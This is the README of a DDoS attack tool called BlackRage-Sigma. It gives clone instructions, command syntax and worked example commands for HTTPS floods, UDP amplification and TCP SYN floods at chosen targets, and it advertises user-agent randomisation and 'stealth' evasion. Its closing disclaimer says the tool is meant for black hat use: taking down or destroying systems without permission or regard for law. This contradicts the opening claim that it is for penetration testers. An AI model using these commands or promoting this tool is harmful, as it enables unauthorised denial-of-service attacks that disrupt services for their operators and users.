# Ghost_Black_Rage_DDos Attack Tool

# BlackRage-Sigma 🚀

**BlackRage-Sigma** is a high-performance network stress testing tool engineered for penetration testers and cybersecurity researchers. Features Sigma-grade attack vectors and CyberGhost evasion techniques.


## Features ✨
- **4 Attack Modes**: HTTP/HTTPS/TCP/UDP flooding
- **SSL/TLS Support**: Bypass encrypted endpoints
- **Randomized User-Agents**: Evade basic fingerprinting
- **Thread-Optimized**: 200+ concurrent threads by default
- **CyberGhost Mode**: Stealth packet delivery system


## Installation ⚙️

# Clone repository
git clone https://github.com/sigma-cyber-ghost/Ghost_Black_Rage_DDos.git
cd /Ghost_Black_Rage_DDos

Usage 🎯

python3black_range.py [MODE] [TARGET] [OPTIONS]

Parameter	Description	Default
mode	http/https/tcp/udp	Required
target_host	IP/Domain to target	Required
-p, --port	Destination port	Auto-detected*
-P, --path	URL path (HTTP/S only)	/
-t, --threads	Attack threads (50-2000)	200
**Port defaults: HTTP=80, HTTPS=443, TCP/UDP=80*

Attack Explain:

# HTTPS flood with custom path
python black_range.py https example.com -p 443 -P /login -t 500

# UDP amplification attack
python black_range.py udp 192.168.1.100 -p 53

# TCP SYN flood
python black_range.py tcp target-ip -t 1000

Disclaimer ⚠️
This tool is built for black hat operations. Use it to take down, disrupt, or destroy target systems without regard for law or consequence. No permissions. No warnings. Full responsibility rests on the operator. Chaos is the only rule.
